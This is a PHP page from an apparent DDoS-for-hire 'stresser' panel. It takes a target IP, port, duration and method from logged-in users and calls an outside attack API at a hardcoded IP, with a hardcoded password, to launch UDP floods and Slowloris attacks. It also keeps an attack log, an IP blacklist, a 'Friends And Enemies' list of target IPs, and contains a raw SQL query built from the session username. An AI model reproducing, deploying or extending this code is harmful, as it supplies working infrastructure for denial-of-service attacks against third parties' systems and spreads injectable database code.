<?php
ob_start();
require_once 'includes/db.php';
require_once 'includes/init.php';
if (!($user -> LoggedIn()))
{
	header('location: login.php');
	die();
}

if (!($user -> notBanned($odb)))
{
	header('location: login.php');
	die();
}
include("header.php");
?>


          

            <!-- Right side column. Contains the navbar and content of the page -->
            <aside class="right-side">
                <!-- Content Header (Page header) -->
                <section class="content-header">
                    <h1>
                        Stresser
                        <small>DDoS Panel</small>
                    </h1>
				
                    <ol class="breadcrumb">
                        <li><a href="#"><i class="fa fa-dashboard"></i> Home</a></li>
                        <li class="active">Stresser</li>
                    </ol>
                </section>
 <!-- Main content -->
                <section class="content">
                    <!-- START ALERTS AND CALLOUTS -->
 <h2 class="page-header">Alerts and Callouts</h2>
                    <div class="row">
                        <div class="col-md-6">
                            <div class="box box-danger">
                                <div class="box-header">
                                    <i class="fa fa-warning"></i>
                                    <h3 class="box-title">Alerts</h3>
                                </div><!-- /.box-header -->
                                <div class="box-body">
                                    <div class="alert alert-danger alert-dismissable">
                                        <i class="fa fa-ban"></i>
                                        <button type="button" class="close" data-dismiss="alert" aria-hidden="true">&times;</button>
                                       <strong>Attack Status:</strong> <?php

$req = $odb->query('SELECT date,time FROM logs WHERE user="'.$_SESSION['username'].'" AND (date + time)>'.time().' ORDER BY date LIMIT 0,1');

$data = $req->fetch(PDO::FETCH_ASSOC);

if(isset($data) && !empty($data)){

$cible = $data['date']+$data['time'];
	
$now = time();
	
$seconde = $cible - $now;

?>
Flooding... (<?php echo ($seconde < 10 ? "0".$seconde : $seconde); ?> Seconds)
<script type="text/javascript">

	(function(){
	
	var restant = <?php echo $seconde; ?>;
	
	
function update(){

			if(restant > 0){

				$("#decompte").html(restant+" Flooding...(<?php echo ($seconde < 10 ? "0".$seconde : $seconde); ?> Seconds);

			}else{
	
			$("#decompte").html(" Aucune attaque lanc�e...");
	
                        }

			restant--;


        }

		


setInterval(update, 1000);




	})(jQuery);

</script>
  <script type="text/javascript">
form_widget_amount_slider('slider_target',document.forms[0].time,110,10,120);
form_widget_amount_slider('slider_target2',document.forms[0].power,110,1,100);

</script>
<?php

}else{

?>
	
       <i> No attack running currently..</i>

<?php

}

?>

<br>
<br>

<?php
				if (isset($_POST['attackBtn']))
				{
					$host = $_POST['host'];
					
					if($host === $_SERVER['REMOTE_ADDR']){
						echo "ok";
					}else{
						echo "Bitte kaufe Premium um andere IPS zu stressen";
					}
					
					$port = intval($_POST['port']);
					$time = intval($_POST['time']);
					$method = $_POST['method'];
$name3 = $odb -> query("SELECT `api` FROM `SiteConfig` LIMIT 1") -> fetchColumn(0);
					if (empty($host) || empty($time) || empty($port) || empty($method))
					{
						echo '<div class="alert alert-error">Fill in all fields!</div>';
					}
					else
					{
						if (!filter_var($host, FILTER_VALIDATE_IP))
						{
							echo '<div class="alert alert-error">Adresse IP invalid.</div>';
						}
						else
						{
							$SQLCheckBlacklist = $odb -> prepare("SELECT COUNT(*) FROM `blacklist` WHERE `IP` = :host");
							$SQLCheckBlacklist -> execute(array(':host' => $host));
							$countBlacklist = $SQLCheckBlacklist -> fetchColumn(0);
							if ($countBlacklist > 0)
							{
								echo '<div class="alert alert-error">This is a Microsoft or IP blacklist, you can not attack.</div>';
							}
							else
							{
								$checkRunningSQL = $odb -> prepare("SELECT COUNT(*) FROM `logs` WHERE `user` = :username  AND `time` + `date` > UNIX_TIMESTAMP()");
								$checkRunningSQL -> execute(array(':username' => $_SESSION['username']));
								$countRunning = $checkRunningSQL -> fetchColumn(0);
								if ($countRunning == 0)
								{
					
								
ini_set('default_socket_timeout', 5);


if($method == "UDP"){
		@file_get_contents("http://173.242.115.82/api/udp.php?pass=hackuniverse&host=$host&port=$port&time=$time&packet=1000&bytes=65000");

}
if($method == "SLOWLORIS"){
	//system("php api/slowloris.php get 200 $host 200 $time");	
	@file_get_contents("http://173.242.115.82/api/callloris.php?server=$host&time=$time");

}




            $insertLogSQL = $odb -> prepare("INSERT INTO `logs` VALUES(:user, :ip, :port, :time, :method, UNIX_TIMESTAMP())");
										$insertLogSQL -> execute(array(':user' => $_SESSION['username'], ':ip' => $host, ':port' => $port, ':time' => $time, ':method' => $method));
										echo '<div class="alert alert-error">Attack sent to '.$host.':'.$port.' for '.$time.' Seconds  method :  '.$method.'.</div>';
									
									
									
										echo '<div class="alert alert-error">Test Launched</div>';
									
								}
								else
								{
									echo '<div class="alert alert-error">Have an ongoing attack.</div>';
								}
							}
						}
					}
				}
				?>


</center>
                                    </div>
                                    
                                </div><!-- /.box-body -->
                            </div><!-- /.box -->
                        </div><!-- /.col -->

                       
                    <!-- END ALERTS AND CALLOUTS -->

               


<!-- Main content -->
                <section class="content">
                    <!-- START ALERTS AND CALLOUTS -->
   
                    <div class="row">
                        <div class="col-md-6">
                            <div class="box box-warning">
                                <div class="box-header">
                                    <i class="fa fa-hdd-o"></i>
                                    <h3 class="box-title">DDoS Panel</h3>
									
								
<form action="" method="POST">
<br><br><br>

			
<center><fieldset>
				
<?
$ip2 = $_SERVER['REMOTE_ADDR'];

?>
<input  style="width:450px; text-align:center; height:30px" value="<? echo $_SERVER['REMOTE_ADDR'];?>" type="text" name="host" disabled> <br><br>
					<input style="width:210px; text-align:center;  height:30px" placeholder="Port" class="input-small" type="text" maxlength="5" name="port"> 
					<input style="width:210px; text-align:center;  height:30px" value="30" class="input-small" type="text" name="time" disabled> 

			

<br><br>
					<select style="width:250px; text-align:center;  height:40px" name="method">
 <option value="UDP">UDP - Home</option>

					</select>

					<br><br>
					<div class="control-group">
						<div class="controls">

                    <br> <button class="btn btn-danger" name="attackBtn" type="submit" style="width: 300px; height: 65px;"><i class="fa fa-fire"></i> Initiate DDoS Attack</button></form>
</div>
<br>
				</form></fieldset></center>
				</div>
		

                 </div></div> 



        </div>
    </div>
<div class="row-fluid">
    							<article class="span12">
									<!-- new widget -->
									<div class="jarviswidget" id="widget-id-1">
									    <header>
									        <h2>Friends And Enemies

</h2>                           
									    </header>
									    <!-- wrap div -->
									    <div>
									        <div class="inner-spacer"> 
									        <!-- content goes here -->
												<table class="table table-bordered" id="s-table-bordered">
								<thead>
									<tr>
                                        <th>Delete</th>
									    <th>IP</th>
										<th>Type</th>
										<th>Note</th>
									</tr>
								</thead>
								<tbody>
									<?php
									  $SQLSelect = $odb -> prepare("SELECT * FROM `fe` WHERE `userID` = :user ORDER BY `ID` DESC");
									  $SQLSelect -> execute(array(':user' => $_SESSION['ID']));
									  while ($show = $SQLSelect -> fetch(PDO::FETCH_ASSOC))
									  {
										$ipShow = $show['ip'];
										$noteShow = $show['note'];
										$rowID = $show['ID'];
										$type = ($show['type'] == 'f') ? 'Friend' : 'Enemy';
										echo '<tr><td><form method="post"><button class="btn btn-danger btn-mini" name="deleteBtn"><i class="fa fa-trash-o"></i></button><input type="hidden" name="id" value="'.$rowID.'" /></form></td><td>'.$ipShow.'</td><td>'.$type.'</td><td>'.htmlentities($noteShow).'</td></tr>';
									  }
									  ?>							
</form></fieldset></center>
							
                </div>
            </div>
            
      
	
<br>
<br>
<br>				
                   

   

    </body>
</html>